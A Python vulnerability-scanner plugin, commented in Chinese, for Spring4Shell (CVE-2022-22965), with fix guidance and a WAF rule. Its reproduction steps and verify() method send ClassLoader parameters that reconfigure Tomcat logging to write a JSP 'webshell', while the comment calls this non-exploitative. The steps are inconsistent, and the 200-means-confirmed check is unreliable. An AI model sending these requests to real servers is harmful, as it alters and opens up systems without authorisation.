# CVE-2022-22965 Spring4Shell 远程代码执行（Spring Framework DataBinder）
# 漏洞原因：JDK9+ 环境下 Spring 参数绑定可访问 ClassLoader，写 Tomcat AccessLogValve 日志
#   文件 getshell（影响 Spring Framework 5.3.x + JDK9+ + Tomcat war 部署）。
# 本插件仅做存在性验证：发送 class.module.classLoader 探针，检测响应特征判定接口是否可达。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url
from lib.matcher import match_spring4shell_response

# 漏洞命中签名（与 lab/spring_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
S4S_MARKER = 'spring4shell-rce-confirmed'


class Spring4shellPlugin(PluginBase):
    name = 'CVE-2022-22965 Spring4Shell 远程代码执行'
    cve = 'CVE-2022-22965'
    severity = 'high'
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
    compliance = '等保2.0:8.1.3;OWASP:A03:2021'
    category = 'vuln'
    description = 'JDK9+ 下 DataBinder 可访问 ClassLoader，写 Tomcat 日志 getshell（影响 5.3.x）'
    fix = '升级 Spring Framework 至 5.3.18+ / 5.2.20+；或升级 JDK 至不受影响版本'
    fix_detail = (
        '【升级方案】Spring Framework 5.3.x 升级至 5.3.18+，5.2.x 升级至 5.2.20+；\n'
        '  或降级 JDK 至 8（JDK8 不受 ClassLoader 暴露影响，仅为缓解措施）\n'
        '【代码修复】为 Controller 增加 @InitBinder 全局黑名单，禁止绑定 class 属性：\n'
        '  @ControllerAdvice\n'
        '  public class SafeBinder {\n'
        '      @InitBinder\n'
        '      public void setDisallowedFields(WebDataBinder binder) {\n'
        '          binder.setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*");\n'
        '      }\n'
        '  }\n'
        '【配置加固】Tomcat 改用 Embedded 部署（非 war），关闭 AccessLogValve 文件写入；\n'
        '  生产环境禁用 spring-webmvc 对 class.module 链路的参数绑定\n'
        '【WAF 规则】拦截请求参数中含 class.module.classLoader / class.classLoader 的请求\n'
        '【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制'
    )
    reproduce = (
        '# 1. 探测 Spring MVC 接口可达性：\n'
        'curl -i "http://target/"\n'
        '  # 返回 200 即 Spring MVC 接口可达\n'
        '\n'
        '# 2. 发送 Spring4Shell 探针（写 Tomcat AccessLog 为 JSP）：\n'
        'curl -X POST "http://target/" \\\n'
        '  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}c2s65 SPRING4SHELL_PROBE" \\\n'
        '  -d "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \\\n'
        '  -d "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"\n'
        '\n'
        '# 3. 访问写入的 JSP Webshell 验证 RCE：\n'
        'curl "http://target/tomcatwar.jsp"\n'
        '\n'
        '# 预期响应：POST 返回 200 且无 Bad Request/error 标识，访问 JSP 返回 200 即漏洞存在'
    )

    def verify(self, target, session):
        url = join_url(target, '/')
        # Spring4Shell 探针参数（仅触发签名，不执行真实 ClassLoader 利用）
        data = {
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern':
                '%{prefix}c2s65 SPRING4SHELL_PROBE',
            'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
            'class.module.classLoader.resources.context.parent.pipeline.first.directory':
                'webapps/ROOT',
        }
        try:
            resp = session.post(url, data=data)
        except Exception as e:
            print(no('Spring4Shell RCE（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if S4S_MARKER in text:
            print(ok('存在 CVE-2022-22965 Spring4Shell 远程代码执行漏洞'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含 Spring4Shell 特征：{S4S_MARKER}',
                fix=self.fix,
            )
        # 真实漏洞响应：POST class.module.classLoader 探针返回 200 且响应无错误标识
        # 即说明参数绑定可访问 ClassLoader，存在 Spring4Shell 利用条件
        # 严格排除失败响应：含 Bad Request / error / status:4xx / 5xx 的响应不判 CONFIRMED
        if resp.status_code == 200 and match_spring4shell_response(text):
            print(ok('存在 CVE-2022-22965 Spring4Shell 远程代码执行漏洞（真实漏洞响应）'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence='POST class.module.classLoader 返回 200 且响应无错误标识（参数绑定可访问 ClassLoader），证实 Spring4Shell 可达',
                fix=self.fix,
            )
        print(no('不存在 CVE-2022-22965 Spring4Shell 远程代码执行漏洞'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含 Spring4Shell 特征（可能已修复或环境不满足利用条件）')
